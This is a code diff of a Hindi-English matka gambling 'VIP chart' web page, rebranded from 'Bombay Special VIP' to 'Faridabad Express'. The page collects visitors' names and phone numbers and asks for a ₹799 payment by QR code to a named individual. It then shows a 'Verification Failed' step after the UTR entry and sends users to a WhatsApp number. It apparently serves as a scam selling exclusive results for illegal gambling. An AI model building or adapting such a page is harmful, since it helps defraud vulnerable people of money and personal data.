@@ -4,11 +4,8 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>BOMBAY SPECIAL VIP | Official Chart & Fast Results</title>
-    <meta name="description" content="Bombay Special VIP Chart ki official website. Yahan sabse tez live results, VIP charts, aur daily updates milte hain.">
-    <meta name="keywords" content="Bombay Special Chart, Bombay VIP Chart, Bombay Special VIP, Result Tracking, Live Result">
-    <meta name="robots" content="index, follow">
-    <link rel="canonical" href="https://bombayspecialchart.com/">
+    <title>FARIDABAD EXPRESS | Official Chart & Fast Results</title>
+    <meta name="description" content="Faridabad Express Chart ki official website. Yahan sabse tez live results aur VIP charts milte hain.">
     
     <style>
         :root { 
@@ -48,10 +45,6 @@
         .modal-content { background: #fff; width: 85%; max-width: 380px; padding: 20px; border-radius: 15px; color: #333; position: relative; }
         
         input { width: 90%; padding: 10px; margin: 8px 0; border: 2px solid #ccc; border-radius: 8px; font-size: 15px; }
-        
-        .plan-item { border-bottom: 1px solid #eee; padding: 12px 5px; cursor: pointer; text-align: left; }
-        .plan-item h4 { margin: 0; color: var(--dark-blue); font-size: 15px; }
-        .plan-item p { margin: 3px 0 0; color: #666; font-size: 12px; line-height: 1.3; }
 
         #timerBox { display: none; margin: 10px 0; }
         #timerText { font-size: 24px; font-weight: bold; color: var(--red); }
@@ -71,10 +64,10 @@
 </head>
 <body>
 
-<div class="header"><h1>BOMBAY SPECIAL VIP</h1></div>
+<div class="header"><h1>FARIDABAD EXPRESS</h1></div>
 
 <div class="intro-text">
-    <strong>BOMBAY SPECIAL VIP CHART</strong><br>
+    <strong>FARIDABAD EXPRESS CHART</strong><br>
     Unlock VIP for Exclusive access to Today's Result.
 </div>
 
@@ -106,25 +99,12 @@
             <p style="font-size:14px;">आगे बढ़ने के लिए जानकारी भरें</p>
             <input type="text" id="userName" placeholder="आपका नाम (Full Name)">
             <input type="number" id="userPhone" placeholder="मोबाइल नंबर (Mobile No.)">
-            <button class="verify-btn" onclick="goToPlans()" style="background:var(--dark-blue);">NEXT / आगे बढ़ें</button>
+            <button class="verify-btn" onclick="goToPayment()" style="background:var(--dark-blue);">NEXT / आगे बढ़ें</button>
             <p onclick="closeVipModal()" style="color:red; cursor:pointer; margin-top:15px; font-size:14px;">Cancel</p>
         </div>
 
-        <div id="stepPlans" style="display:none;">
-            <h2 style="color:var(--dark-blue); margin-top:0;">Select Plan</h2>
-            <div class="plan-item" onclick="showPayment(1299, '7 Days')">
-                <h4>7 Days VIP - ₹1299</h4>
-                <p>7 दिन के लिए VIP चार्ट एक्सेस।</p>
-            </div>
-            <div class="plan-item" onclick="showPayment(1799, '30 Days')">
-                <h4>30 Days VIP - ₹1799</h4>
-                <p>30 दिन के लिए VIP चार्ट एक्सेस।</p>
-            </div>
-            <button onclick="resetSteps()" style="margin-top:15px; border:none; background:none; color:gray; cursor:pointer;">Back</button>
-        </div>
-
         <div id="stepPay" style="display:none;">
-            <h3 id="payTitle" style="margin:5px 0;"></h3>
+            <h3 style="margin:5px 0; color:var(--red);">VIP Access - ₹799</h3>
             <p style="margin:2px; font-size:13px;"><strong>Pay to: Omkar Yadav</strong></p>
             
             <img src="paytm-png.jpeg" class="qr-img" alt="Payment QR">
@@ -137,14 +117,15 @@
 
             <input type="number" id="utrInput" placeholder="Enter 12 Digit UTR No.">
             <button class="verify-btn" id="verifyBtn" onclick="handleVerify()">VERIFY PAYMENT</button>
+            <button onclick="resetSteps()" style="margin-top:10px; border:none; background:none; color:gray; cursor:pointer; width:100%;">Back</button>
         </div>
 
         <div id="stepFailed" style="display:none;">
             <div style="font-size:50px; color:red; margin:10px 0;">❌</div>
             <h3 style="color:red; margin:5px 0;">Verification Failed!</h3>
-            <p style="font-size:13px;">UTR नंबर या पेमेंट रिकॉर्ड नहीं मिला। कृपया सही जानकारी के साथ दोबारा कोशिश करें।</p>
+            <p style="font-size:13px;">UTR नंबर नहीं मिला। कृपया सही जानकारी के साथ दोबारा कोशिश करें।</p>
             <button class="verify-btn" onclick="resetSteps()" style="background:#4fb5f5; margin-bottom: 10px;">TRY AGAIN</button>
-            <button class="verify-btn" onclick="window.location.href='https://wa.me/918103982813?text=Payment%20Done%20UTR:%20' + document.getElementById('utrInput').value" style="background:#25D366;">HELP ON WHATSAPP</button>
+            <button class="verify-btn" onclick="window.location.href='https://wa.me/918103982813?text=Payment%20Done%20799%20Plan'" style="background:#25D366;">HELP ON WHATSAPP</button>
         </div>
     </div>
 </div>
@@ -152,13 +133,13 @@
 <script>
     let timeLeft = 120;
     let timerId = null;
+    const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
 
     function openVipModal() { document.getElementById('vipModal').style.display = 'flex'; resetSteps(); }
     function closeVipModal() { document.getElementById('vipModal').style.display = 'none'; clearInterval(timerId); }
 
     function resetSteps() {
         document.getElementById('stepInfo').style.display = 'block';
-        document.getElementById('stepPlans').style.display = 'none';
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'none';
         document.getElementById('timerBox').style.display = 'none';
@@ -168,18 +149,12 @@
         clearInterval(timerId);
     }
 
-    function goToPlans() {
+    function goToPayment() {
         let n = document.getElementById('userName').value;
         let p = document.getElementById('userPhone').value;
         if(!n || p.length < 10) { alert("कृपया सही जानकारी भरें।"); return; }
         document.getElementById('stepInfo').style.display = 'none';
-        document.getElementById('stepPlans').style.display = 'block';
-    }
-
-    function showPayment(amt, plan) {
-        document.getElementById('stepPlans').style.display = 'none';
         document.getElementById('stepPay').style.display = 'block';
-        document.getElementById('payTitle').innerText = plan + " Plan";
     }
 
     function handleVerify() {
@@ -209,8 +184,6 @@
         document.getElementById('stepFailed').style.display = 'block';
     }
 
-    const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
-
     async function loadChart() {
         const gridData = document.getElementById('gridData');
         try {
@@ -239,6 +212,7 @@
                             html += `<div class="cell"></div>`;
                         }
                     } else {
+                        // Logic for Red Numbers
                         let isRed = (jodi.length >= 2 && (jodi[0] === jodi[1] || Math.abs(parseInt(jodi[0]) - parseInt(jodi[1])) === 5)) || jodi.includes('*');
                         let lp = leftPanna.split('').map(s => `<span>${s}</span>`).join('');
                         let rp = rightPanna.split('').map(s => `<span>${s}</span>`).join('');
